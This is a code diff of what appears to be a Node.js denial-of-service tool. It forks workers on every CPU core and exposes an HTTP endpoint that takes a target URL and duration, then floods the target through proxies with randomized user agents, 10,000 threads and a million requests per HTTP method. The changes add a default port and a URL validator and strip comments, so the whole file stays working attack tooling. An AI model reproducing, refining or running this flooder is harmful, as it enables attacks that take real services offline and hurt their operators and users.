@@ -10,33 +10,32 @@ const { rainbow } = require("gradient-string");
 const { fakeState } = require("./fakeState.js");
 const randomUseragent = require("random-useragent");
 
-const numCPUs = os.cpus().length; // Number of CPU cores
-const PORT_RANGE = { min: 20000, max: 65535 }; // Port range for random assignment
+const numCPUs = os.cpus().length;
+const PORT_RANGE = { min: 20000, max: 65535 };
+const DEFAULT_PORT = 25694;
 
-// Function to generate a random port
 const getRandomPort = () => Math.floor(Math.random() * (PORT_RANGE.max - PORT_RANGE.min + 1)) + PORT_RANGE.min;
 
 if (cluster.isMaster) {
     console.log(rainbow(`Master ${process.pid} is running`));
 
-    // Track used ports to avoid conflicts
-    const usedPorts = new Set();
+    const usedPorts = new Set([DEFAULT_PORT]);
 
-    // Fork workers for each CPU core
-    for (let i = 0; i < numCPUs; i++) {
+    // Fork first worker with default port
+    cluster.fork({ WORKER_PORT: DEFAULT_PORT });
+
+    // Fork remaining workers with random ports
+    for (let i = 1; i < numCPUs; i++) {
         let port;
         do {
             port = getRandomPort();
         } while (usedPorts.has(port));
         usedPorts.add(port);
-
-        // Pass the port to the worker via environment variable
         cluster.fork({ WORKER_PORT: port });
     }
 
     cluster.on("exit", (worker, code, signal) => {
         console.log(rainbow(`Worker ${worker.process.pid} died with code ${code}, signal ${signal}`));
-        // Restart a worker with a new random port
         let port;
         do {
             port = getRandomPort();
@@ -45,24 +44,26 @@ if (cluster.isMaster) {
         cluster.fork({ WORKER_PORT: port });
     });
 } else {
-    // Worker code
     const app = express();
     app.use(express.json());
 
     const stateFilePath = path.join(__dirname, "attackState.json");
     const proxyFilePath = path.join(__dirname, "proxy.txt");
 
-    // Configuration
-    const numThreads = 10000; // High thread count to maximize parallel requests
+    const numThreads = 10000;
     const httpMethods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];
-    const requestsPerMethod = 1000000; // Send requests per HTTP method per iteration
+    const requestsPerMethod = 1000000;
 
-    // State Management
     const ensureStateFileExists = async () => {
         try {
             await fs.access(stateFilePath);
         } catch {
-            await fs.writeFile(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
+            await fs.writeFile(stateFilePath, JSON.stringify({ 
+                continueAttack: false, 
+                startTime: null, 
+                duration: 0, 
+                targetUrl: null 
+            }));
         }
     };
 
@@ -74,19 +75,26 @@ if (cluster.isMaster) {
         }
     };
 
+    const isValidUrl = (url) => {
+        try {
+            new URL(url);
+            return /^https?:\/\//i.test(url);
+        } catch {
+            return false;
+        }
+    };
+
     const loadState = async () => {
         await ensureStateFileExists();
         try {
             const data = await fs.readFile(stateFilePath, "utf-8");
             const state = JSON.parse(data);
-            if (
-                state &&
-                typeof state.continueAttack === "boolean" &&
-                state.targetUrl &&
-                /^https?:\/\//.test(state.targetUrl) &&
-                Number.isInteger(state.startTime) &&
-                Number.isInteger(state.duration)
-            ) {
+            if (state && 
+                typeof state.continueAttack === "boolean" && 
+                state.targetUrl && 
+                isValidUrl(state.targetUrl) &&
+                Number.isInteger(state.startTime) && 
+                Number.isInteger(state.duration)) {
                 return state;
             }
             return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
@@ -100,7 +108,10 @@ if (cluster.isMaster) {
 
     const initializeState = async () => {
         attackState = await loadState();
-        attackState.continueAttack = attackState.continueAttack && attackState.startTime && attackState.duration && Date.now() <= attackState.startTime + attackState.duration;
+        attackState.continueAttack = attackState.continueAttack && 
+                                   attackState.startTime && 
+                                   attackState.duration && 
+                                   Date.now() <= attackState.startTime + attackState.duration;
     };
 
     const langHeaders = ["en-US,en;q=0.9", "fr-FR,fr;q=0.9"];
@@ -146,7 +157,7 @@ if (cluster.isMaster) {
     };
 
     const generateRandomPayload = () => ({
-        data: { id: Math.random().toString(36).substring(7) }, // Keep payload lightweight
+        data: { id: Math.random().toString(36).substring(7) },
         contentType: "application/json",
     });
 
@@ -208,7 +219,7 @@ if (cluster.isMaster) {
     };
 
     const startAttack = async (url, durationHours) => {
-        if (!url || !/^https?:\/\//.test(url)) {
+        if (!url || !isValidUrl(url)) {
             console.error(`Worker ${process.pid} - Invalid URL provided.`);
             return;
         }
@@ -233,7 +244,6 @@ if (cluster.isMaster) {
             fs.unlink(stateFilePath).catch(() => {});
         }, attackState.duration);
 
-        // Distribute threads across workers
         const threadsPerWorker = Math.ceil(numThreads / numCPUs);
         for (let i = 0; i < Math.min(threadsPerWorker, proxies.length); i++) {
             if (!attackState.continueAttack) break;
@@ -255,7 +265,7 @@ if (cluster.isMaster) {
         const url = req.query.url;
         const durationHours = parseFloat(req.query.duration) || Number.MAX_SAFE_INTEGER / (60 * 60 * 1000);
 
-        if (!url || !/^https?:\/\//.test(url)) {
+        if (!url || !isValidUrl(url)) {
             return res.status(400).json({ error: "Invalid URL." });
         }
         if (isNaN(durationHours) || durationHours <= 0) {
@@ -266,7 +276,6 @@ if (cluster.isMaster) {
         await startAttack(url, durationHours);
     });
 
-    // Start the server with retry logic for port conflicts
     const startServer = (port, retries = 3) => {
         const server = app.listen(port, async () => {
             console.log(rainbow(`Worker ${process.pid} running on http://localhost:${port}`));
@@ -294,8 +303,7 @@ if (cluster.isMaster) {
         });
     };
 
-    // Get the port from environment variable or use a random one
-    const port = parseInt(process.env.WORKER_PORT) ||  25694 || getRandomPort();
+    const port = parseInt(process.env.WORKER_PORT) || DEFAULT_PORT || getRandomPort();
     startServer(port);
 
     console.log(rainbow(`Worker ${process.pid} started on port ${port}`));
